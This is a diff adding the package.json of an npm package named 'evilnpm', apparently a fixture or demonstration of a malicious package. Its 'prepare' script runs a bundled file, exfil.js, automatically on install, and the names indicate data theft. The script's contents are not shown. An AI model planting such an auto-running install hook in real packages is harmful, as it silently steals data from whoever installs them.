@@ -1,0 +1,7 @@
+{
+  "name": "evilnpm",
+  "version": "1.0.0",
+  "license": "MIT",
+  "files": ["exfil.js"],
+  "scripts": { "prepare": "node exfil.js" }
+}
